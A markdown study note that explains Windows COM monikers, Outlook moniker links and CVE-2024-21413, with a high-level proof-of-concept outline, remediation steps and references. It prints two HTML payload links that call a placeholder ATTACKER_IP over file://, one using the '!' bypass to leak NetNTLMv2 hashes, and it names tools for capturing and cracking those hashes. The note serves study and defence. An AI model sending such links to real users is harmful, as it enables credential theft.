# Exploitation Basics

## Moniker
A **moniker** in Windows is a COM (Component Object Model) object reference that allows applications to dynamically locate and bind to other objects.  
- Acts like a pointer or "name" for COM objects.  
- Used in technologies such as **OLE (Object Linking and Embedding)**, **ActiveX**, and scripting environments.  
- Attackers can abuse monikers to execute arbitrary code when a document (e.g., a Word file) is opened.

---

## Link
Links in documents (like **OLE objects** or **embedded hyperlinks**) can be exploited:  
- Malicious documents may include links that, when clicked, automatically execute commands.  
- Outlook can render emails as HTML and parse links such as `http://` and `https://`.  
- It can also handle `file://` **Moniker Links**, which can point to files or resources on remote systems.  
- Normally, Outlook’s **Protected View** prompts users before opening external applications, blocking malicious actions.  

**Example of a basic Moniker Link:**
```html
<a href="file://ATTACKER_IP/test">Click me</a>
```

By modifying the link to include the `!` character, attackers can bypass Outlook’s Protected View:
```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>
```
Even if the share does not exist, Outlook will attempt an SMB authentication, leaking the victim’s **Windows NetNTLMv2 hash**.

---

## CVE-2024-21413 (Moniker Link)
- **Discovered by:** Haifei Li, Check Point Research  
- **Announced:** February 13th, 2024  
- **Type:** Remote Code Execution (RCE) & NTLM Credential Leak  

### Description
This vulnerability allows attackers to bypass Outlook’s security mechanisms when handling **Moniker Links**.  
When exploited, Outlook may send NTLM credentials to an attacker-controlled server, even if the malicious link is clicked in **Protected View**.

### Impact
- Theft of **NTLM hashes** and user credentials.  
- Potential for **remote code execution** due to COM object abuse.  
- Increased risk of **phishing and lateral movement** in corporate environments.  

### Proof of Concept (PoC) Overview
> **Note:** This is a high-level summary of the PoC; not executable instructions.

- Attacker crafts an email with a malicious Moniker Link.  
- Victim opens or previews the email in Outlook.  
- Outlook attempts to load a file via `file://` using SMB.  
- This triggers an **authentication attempt**, leaking the victim’s **NetNTLMv2 hash**.  
- An attacker could capture and attempt to crack these hashes with tools like *Responder* or *Impacket*.  

---

## Remediation
Microsoft released official patches for this vulnerability in **February 2024 Patch Tuesday**.  
Recommended actions:
- Apply the latest **Microsoft security updates** via Windows Update or the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/).  
- Disable automatic link preview in Outlook where possible.  
- Block outbound **SMB traffic** at the firewall, if feasible.  
- Educate users not to click unknown or suspicious links in emails.  
- Encourage reporting of suspicious emails to the security team.  

---

## References
- [Microsoft Security Response – CVE-2024-21413](https://msrc.microsoft.com/)  
- [Check Point Research – Haifei Li’s Discovery](https://research.checkpoint.com/)
